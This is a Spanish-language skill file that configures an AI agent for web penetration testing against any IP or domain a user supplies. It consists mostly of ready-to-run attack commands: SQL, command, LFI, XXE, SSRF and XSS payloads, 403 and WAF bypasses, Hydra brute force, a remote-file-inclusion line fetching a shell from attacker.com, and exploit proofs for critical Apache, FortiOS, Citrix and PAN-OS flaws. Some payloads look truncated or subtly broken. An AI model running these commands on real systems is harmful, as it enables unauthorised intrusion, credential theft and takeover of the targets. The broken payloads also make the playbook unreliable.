---
name: web-pentest
description: >
  Usar esta habilidad SIEMPRE que el usuario quiera realizar pruebas de penetración, auditoría,
  análisis automático o explotación de vulnerabilidades sobre un portal web, aplicación web,
  API REST, servicio HTTP/HTTPS, IP o FQDN con el servicio web activo. Activar cuando se mencionen:
  auditoría web, SQLi, XSS, LFI, RFI, inyección de comandos, traversal de directorios, CSRF,
  XXE, SSRF, evasión de WAF, omisión de código 403, cabeceras HTTP inseguras, cifrados TLS débiles,
  smuggling HTTP, proxy abierto, fuerza bruta web, nikto, wapiti, dirb, gobuster, whatweb,
  CVE web, Apache, Nginx, Citrix, FortiGate, F5, PaperCut, Cisco IOS XE, Spring4Shell,
  o cualquier técnica ofensiva sobre el protocolo HTTP/HTTPS. También activar cuando el usuario
  proporcione una IP/FQDN y pida: reconocimiento web, explotar portal, POC web, escanear web,
  descubrir rutas, buscar secretos, analizar TLS, o auditoría OWASP. Repositorio de referencia:
  https://github.com/hackingyseguridad/webaudit/
---

# Habilidad de Pentesting Web — hackingyseguridad/webaudit

Habilidad de auditoría ofensiva sobre servicios HTTP/HTTPS. Cubre el ciclo completo:
reconocimiento → análisis de tecnologías → escaneo de vulnerabilidades OWASP →
explotación de CVEs → evasión de WAF → generación de evidencias.

> ⚠️ Uso exclusivo en entornos con autorización expresa por escrito. Hacking ético.

---

## INSTALACIÓN RÁPIDA (Kali Linux)

```bash
git clone https://github.com/hackingyseguridad/webaudit.git
cd webaudit
bash instalar.sh

# Dependencias requeridas por webaudit.sh
apt install -y davtest dirb dmitry dnsenum dnsmap dnsrecon dnswalk fierce \
  golismero lbd nikto nmap sslyze theharvester uniscan wafw00f wapiti \
  wget whatweb whois xsser
```

---

## FASE 1 — Reconocimiento e identificación tecnológica

### 1.1 Auditoría automática completa (punto de entrada principal)

```bash
# Auditoría completa automatizada — ejecutar primero siempre
bash webaudit.sh <IP_o_FQDN>

# Auditoría sobre FQDN con resolución DNS incluida
bash fqdnaudit.sh <dominio.com>

# Exploración general de la web
bash explorarweb.sh <URL>

# Descarga completa del sitio para análisis local
bash desgargarweb.sh <URL>
```

### 1.2 Identificación de tecnologías y cabeceras

```bash
# Identificar tecnologías del servidor (CMS, lenguaje, framework)
whatweb http://<IP_o_FQDN>
whatweb -a 3 http://<IP_o_FQDN>   # modo agresivo

# Cabeceras HTTP de seguridad (buscar ausencias críticas)
bash httpbasico.sh <IP_o_FQDN>
bash get.sh <URL>
curl -I http://<IP_o_FQDN>

# Métodos HTTP permitidos (buscar PUT, DELETE, TRACE peligrosos)
bash metodos.sh <IP_o_FQDN>
curl -X OPTIONS http://<IP_o_FQDN> -v

# Ver cabeceras de seguridad esperadas
cat x-cabeceras.txt
```

### 1.3 Reconocimiento DNS y OSINT

```bash
whois <dominio.com>
dnsenum <dominio.com>
dnsrecon -d <dominio.com>
fierce --domain <dominio.com>
theharvester -d <dominio.com> -b google,bing,linkedin
```

---

## FASE 2 — Descubrimiento de rutas y secretos

### 2.1 Enumeración de directorios y ficheros

```bash
# Enumeración básica con dirb
dirb http://<IP_o_FQDN>
dirb http://<IP_o_FQDN> /usr/share/wordlists/dirb/big.txt

# Gobuster (más rápido, recomendado)
gobuster dir -u http://<IP_o_FQDN> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Feroxbuster (recursivo)
feroxbuster -u http://<IP_o_FQDN> -w /usr/share/wordlists/dirb/common.txt

# Script del repositorio
bash buscar.sh <IP_o_FQDN>
```

### 2.2 Búsqueda de secretos expuestos

```bash
# Buscar claves API, tokens, credenciales en el código fuente
bash secretos.sh <URL>
bash buscasecretos.sh <URL>
bash buscasecretosauto.sh <URL>

# Buscar ficheros sensibles típicos
curl http://<IP>/.env
curl http://<IP>/config.php
curl http://<IP>/wp-config.php
curl http://<IP>/.git/config
curl http://<IP>/phpinfo.php
curl http://<IP>/backup.zip
```

### 2.3 Evasión de código 403 (acceso prohibido)

```bash
# Técnicas de evasión de restricciones 403
bash salta403.sh <IP_o_FQDN> <ruta>

# Pruebas manuales de evasión
curl -H "X-Forwarded-For: 127.0.0.1" http://<IP>/<ruta>
curl -H "X-Original-URL: /<ruta>" http://<IP>/
curl http://<IP>/%2F<ruta>
curl http://<IP>/<ruta>..;/

# Evasión con códigos 4xx
bash curl403.sh <IP_o_FQDN>
bash curl404.sh <IP_o_FQDN>
bash curl4xx.sh <IP_o_FQDN>
```

---

## FASE 3 — Análisis de TLS/SSL y cifrados

```bash
# Análisis completo de TLS (versiones, cifrados, certificado)
bash qtls.sh <IP_o_FQDN>
bash qtls2.sh <IP_o_FQDN>

# Con sslyze
sslyze --regular <IP_o_FQDN>

# Con nmap NSE
nmap -p 443 --script ssl-enum-ciphers,ssl-cert,ssl-dh-params <IP_o_FQDN>

# Referencia de cifrados vulnerables
# Ver: cifrados.xls en el repositorio webaudit
```

**Cifrados vulnerables a detectar:** SSLv2, SSLv3, TLS 1.0, RC4, DES, 3DES, EXPORT,
NULL ciphers, cifrados sin autenticación (aNULL), claves Diffie-Hellman débiles (<2048 bits).

---

## FASE 4 — Escaneo automático de vulnerabilidades OWASP

### 4.1 Nikto — escaneo general

```bash
# Escaneo completo
nikto -h http://<IP_o_FQDN>
nikto -h https://<IP_o_FQDN> -ssl
nikto -h <IP_o_FQDN> -p 8080,8443,8888

# Con salida para informe
nikto -h http://<IP_o_FQDN> -o nikto_resultado.html -Format htm
```

### 4.2 Wapiti — análisis de vulnerabilidades web

```bash
# Análisis completo de vulnerabilidades OWASP
wapiti -u http://<IP_o_FQDN> -o wapiti_informe -f html

# Módulos específicos
wapiti -u http://<IP_o_FQDN> -m sql,xss,file,exec,xxe,ssrf
```

### 4.3 Uniscan

```bash
uniscan -u http://<IP_o_FQDN> -qweds
```

---

## FASE 5 — Inyecciones (pruebas de concepto OWASP)

### 5.1 Inyección SQL

```bash
# Scripts del repositorio
bash sqli.sh <URL_con_parametro>
bash sqliauto.sh <URL_con_parametro>

# Con sqlmap (herramienta estándar)
sqlmap -u "http://<IP>/page?id=1" --batch --dbs
sqlmap -u "http://<IP>/page?id=1" --batch --tables -D <base_de_datos>
sqlmap -u "http://<IP>/login" --data="user=admin&pass=1" --batch

# Detección manual básica
curl "http://<IP>/page?id=1'"
curl "http://<IP>/page?id=1 OR 1=1--"
curl "http://<IP>/page?id=1 AND SLEEP(5)--"
```

### 5.2 Inclusión de ficheros locales (LFI)

```bash
# Detección básica
curl "http://<IP>/page?file=../../../../etc/passwd"
curl "http://<IP>/page?file=....//....//....//etc/passwd"
curl "http://<IP>/page?file=php://filter/convert.base64-encode/resource=index.php"

# Traversal con script NSE del repositorio
nmap -p 80 --script traversal.nse <IP>

# Inclusión de ficheros de registro (log poisoning hacia RCE)
curl "http://<IP>/page?file=/var/log/apache2/access.log"
```

### 5.3 Inclusión de ficheros remotos (RFI)

```bash
# Verificar si el servidor resuelve URLs externas
curl "http://<IP>/page?file=http://attacker.com/shell.txt"
curl "http://<IP>/page?file=http://127.0.0.1/admin"
```

### 5.4 Inyección de comandos

```bash
# Detección básica en parámetros
curl "http://<IP>/page?cmd=id"
curl "http://<IP>/ping?host=127.0.0.1;id"
curl "http://<IP>/ping?host=127.0.0.1|whoami"
curl "http://<IP>/ping?host=127.0.0.1%0aid"

# Con Commix (herramienta especializada)
commix --url="http://<IP>/page?cmd=INJECT_HERE"
```

### 5.5 Secuencias de comandos en sitios cruzados (XSS)

```bash
# Con xsser (repositorio webaudit lo incluye)
xsser -u "http://<IP>/page?q=XSS"
xsser --auto -u "http://<IP>/page?q=XSS"

# Cargas útiles básicas de verificación
curl "http://<IP>/search?q=<script>alert(1)</script>"
curl "http://<IP>/search?q=<img src=x onerror=alert(1)>"
curl "http://<IP>/search?q=javascript:alert(1)"
```

### 5.6 Entidades externas XML (XXE)

```bash
# Carga útil básica de XXE
curl -X POST http://<IP>/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### 5.7 Falsificación de peticiones del lado del servidor (SSRF)

```bash
# Detección de SSRF en parámetros de URL
curl "http://<IP>/fetch?url=http://127.0.0.1/admin"
curl "http://<IP>/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://<IP>/fetch?url=file:///etc/passwd"
```

---

## FASE 6 — Autenticación y control de acceso

### 6.1 Fuerza bruta sobre formularios y autenticación básica

```bash
# Autenticación básica HTTP
bash httpauthbasic.sh <IP_o_FQDN>
bash httpauthcod.sh <IP_o_FQDN>
bash httpsauthcod.sh <IP_o_FQDN>

# Con Hydra sobre formulario web
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=Incorrecto"

# Con Hydra sobre autenticación básica
hydra -L users.txt -P claves.txt http-get://<IP>/admin

# Fuerza bruta sobre .htpasswd
nmap -p 80 --script http-brute --script-args \
  "http-brute.path=/admin" <IP>
nmap -p 80 --script htpasswd.nse <IP>
```

### 6.2 Acceso al panel phpMyAdmin

```bash
nmap -p 80,443 --script phpadmin.nse <IP>
```

### 6.3 Proxy abierto y encadenamiento

```bash
# Detectar proxy abierto
bash openproxy.sh <IP>
bash proxy.sh <IP>

# Petición a través de proxy
curl -x http://<IP>:8080 http://destino_interno/admin
```

---

## FASE 7 — Contrabando de peticiones HTTP (HTTP Smuggling)

```bash
# Detección de HTTP Request Smuggling
bash smugg.sh <IP_o_FQDN>

# Detección con herramienta especializada
python3 smuggler.py -u http://<IP>/

# Prueba manual CL.TE
curl -X POST http://<IP>/ \
  -H "Content-Length: 13" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nSMUGGLED"
```

---

## FASE 8 — Evasión de WAF

```bash
# Detectar WAF activo
wafw00f http://<IP_o_FQDN>
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint <IP>

# Evasión con scripts del repositorio
bash wafbypass.sh <IP_o_FQDN>
bash wafbypass2.sh <IP_o_FQDN>
python3 wafbypass.py <URL>

# Técnicas de evasión manual
# Codificación URL
curl "http://<IP>/page?id=1%20OR%201%3D1"
# Mayúsculas/minúsculas mezcladas
curl "http://<IP>/page?id=1 UnIoN SeLeCt 1,2,3--"
# Comentarios SQL
curl "http://<IP>/page?id=1 UN/**/ION SE/**/LECT 1,2,3--"
# Codificación HTML
curl "http://<IP>/search?q=&lt;script&gt;alert(1)&lt;/script&gt;"
```

---

## FASE 9 — Explotación de CVEs web

### Tabla de decisión rápida

| Tecnología detectada | CVE prioritario | Gravedad | Script disponible |
|---------------------|-----------------|----------|-------------------|
| Apache 2.4.49-2.4.50 | CVE-2021-41773 (RCE/LFI) | CRÍTICO 9.8 | CVE-2021-41773.nse |
| Spring Framework < 5.3.18 | CVE-2022-22965 (Spring4Shell) | CRÍTICO 9.8 | CVE-2022-22965.nse |
| Citrix ADC/Gateway | CVE-2019-19781 (RCE) | CRÍTICO 9.8 | CVE-2019-19781.nse |
| PaperCut MF/NG | CVE-2023-27350 (RCE sin auth) | CRÍTICO 9.8 | CVE-2023-27350.nse |
| Cisco IOS XE Web UI | CVE-2023-20198 (privesc) | CRÍTICO 10.0 | CVE-2023-20198.nse |
| PAN-OS GlobalProtect | CVE-2024-3400 (inyección comandos) | CRÍTICO 10.0 | CVE-2024-3400.nse |
| Fortinet FortiOS | CVE-2022-40684 (omisión auth) | CRÍTICO 9.8 | cve-2022-40684.nse |
| Fortinet FortiNAC | CVE-2022-39952 (escritura ficheros) | CRÍTICO 9.8 | CVE-2022-39952.nse |
| Apache mod_proxy | CVE-2022-31813 (evasión cabeceras) | ALTO 7.5 | CVE-2022-31813.sh |
| Juniper J-Web | CVE-2023-36845 (RCE sin auth) | CRÍTICO 9.8 | CVE-2023-36845.nse |
| Backup Migrate (WP) | CVE-2023-6553 (RCE) | CRÍTICO 9.8 | CVE-2023-6553.nse |
| F5 BIG-IP | CVE local | ALTO | f5.nse |
| NetScaler/Citrix ADC | CVE local | CRÍTICO | netscaler.nse |

### CVE-2021-41773 — Apache Path Traversal / RCE (CRÍTICO 9.8)
**Afecta:** Apache HTTP Server 2.4.49 – 2.4.50

```bash
# Verificación con NSE
nmap -p 80,443 --script CVE-2021-41773.nse <IP>

# Prueba de concepto LFI
curl "http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# Prueba de concepto RCE (si mod_cgi activo)
curl -X POST "http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"
```

### CVE-2022-22965 — Spring4Shell (CRÍTICO 9.8)
**Afecta:** Spring Framework < 5.3.18 / < 5.2.20 con JDK >= 9

```bash
nmap -p 8080 --script CVE-2022-22965.nse <IP>

# Prueba de concepto básica
curl -X POST "http://<IP>/vulnerable" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B..."
```

### CVE-2019-19781 — Citrix ADC / Gateway RCE (CRÍTICO 9.8)
**Afecta:** Citrix ADC y Citrix Gateway

```bash
nmap -p 443 --script CVE-2019-19781.nse <IP>

# Lectura de fichero de credenciales
curl https://<IP>/vpn/../vpns/cfg/smb.conf --path-as-is -k
```

### CVE-2023-27350 — PaperCut RCE sin autenticación (CRÍTICO 9.8)
**Afecta:** PaperCut MF/NG < 22.0.9

```bash
nmap -p 9191,9192 --script CVE-2023-27350.nse <IP>
```

### CVE-2023-20198 — Cisco IOS XE Web UI (CRÍTICO 10.0)
**Afecta:** Cisco IOS XE con interfaz web habilitada

```bash
nmap -p 80,443 --script CVE-2023-20198.nse <IP>

# Verificación manual
curl -k https://<IP>/webui/logoutconfirm.html?logon_hash=1
```

### CVE-2024-3400 — PAN-OS GlobalProtect Inyección (CRÍTICO 10.0)
**Afecta:** PAN-OS < 11.1.2-h3 / < 11.0.4-h1 / < 10.2.9-h1

```bash
nmap -p 443 --script CVE-2024-3400.nse <IP>

# Prueba de concepto
curl -X POST "https://<IP>/ssl-vpn/hipreport.esp" \
  -H "Cookie: SESSID=../../../var/appweb/sslvpndocs/global-protect/portal/css/poc.txt" \
  --data "$(cat /etc/passwd)" -k
```

### CVE-2022-40684 — FortiOS Omisión de autenticación (CRÍTICO 9.8)
**Afecta:** FortiOS 7.0.0-7.0.6, FortiOS 7.2.0-7.2.1

```bash
nmap -p 443 --script cve-2022-40684.nse <IP>
bash cve-40684-2022.sh <IP>

# Prueba de concepto
curl -k -X GET https://<IP>/api/v2/cmdb/system/admin/admin \
  -H "User-Agent: Report Runner" \
  -H "Forwarded: for=127.0.0.1;by=127.0.0.1;host=<IP>"
```

### CVE-2022-39952 — FortiNAC Escritura de ficheros arbitrarios (CRÍTICO 9.8)
**Afecta:** FortiNAC < 9.4.1

```bash
nmap -p 443 --script CVE-2022-39952.nse <IP>
```

### CVE-2023-36845 — Juniper J-Web RCE sin autenticación (CRÍTICO 9.8)
**Afecta:** Juniper Junos OS con J-Web habilitado

```bash
nmap -p 80,443 --script CVE-2023-36845.nse <IP>
```

### CVE-2023-6553 — Backup Migrate WordPress RCE (CRÍTICO 9.8)
**Afecta:** Plugin Backup Migration para WordPress < 1.3.8

```bash
nmap -p 80,443 --script CVE-2023-6553.nse <IP>
```

### Apache apachebleed / fuga de información

```bash
bash apachebleed.sh <IP>
```

### Scripts NSE adicionales del repositorio

```bash
# Acceso Citrix mediante NetScaler
nmap -p 443 --script netscaler.nse <IP>
nmap -p 443 --script citrix.nse <IP>

# F5 BIG-IP
nmap -p 443 --script f5.nse <IP>

# phpMyAdmin expuesto
nmap -p 80,443 --script phpadmin.nse <IP>

# .htpasswd expuesto
nmap -p 80 --script htpasswd.nse <IP>

# Traversal de directorios genérico
nmap -p 80,443 --script traversal.nse <IP>

# Consultar listado completo de scripts NSE disponibles
cat scriptsnmapnse.md
```

---

## FASE 10 — Prueba de concepto en localhost y servicios internos

```bash
# Detectar servicios internos expuestos por SSRF
bash localhost.sh <IP>

# Pruebas generales del entorno
bash pruebas.sh <IP_o_FQDN>
```

---

## PLANTILLA DE HALLAZGO WEB PARA INFORME

```
HALLAZGO:  [Nombre del CVE / Categoría OWASP]
Servicio:  HTTP/HTTPS — [servidor y versión]
IP/FQDN:   [objetivo]
Puerto:    80 / 443 (o personalizado)
CVSS v3.1: [puntuación] ([Crítico/Alto/Medio/Bajo])
Vector:    [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]
CWE:       [CWE-nnn — Descripción]

DESCRIPCIÓN:
[Descripción técnica de la vulnerabilidad detectada]

PRUEBA DE CONCEPTO / EVIDENCIA:
$ [comando ejecutado]
[salida recortada]

IMPACTO:
[Ejecución remota / Escalada de privilegios / Fuga de información /
 Omisión de autenticación / Denegación de servicio / Toma de control]

REMEDIACIÓN:
- Actualizar [producto] a la versión >= [versión parcheada]
- [Configuración de bastionado recomendada]
- [Cabeceras de seguridad ausentes a añadir]

REFERENCIAS:
- https://nvd.nist.gov/vuln/detail/[CVE]
- https://owasp.org/www-project-top-ten/
- https://github.com/hackingyseguridad/webaudit/
```

---

## CABECERAS DE SEGURIDAD HTTP — VERIFICACIÓN

```bash
# Comprobar presencia de cabeceras de seguridad obligatorias
curl -I http://<IP> 2>/dev/null | grep -iE \
  "strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy"

# Cabeceras que deben estar presentes (referencia: x-cabeceras.txt del repo)
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# Content-Security-Policy: default-src 'self'
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Referrer-Policy: no-referrer
# Permissions-Policy: geolocation=(), camera=(), microphone=()
```

---

## REFERENCIAS

- Repositorio: https://github.com/hackingyseguridad/webaudit/
- Scripts NSE disponibles: `scriptsnmapnse.md` (en el repositorio)
- Cifrados TLS vulnerables: `cifrados.xls` (en el repositorio)
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CVE Nacional: https://nvd.nist.gov/
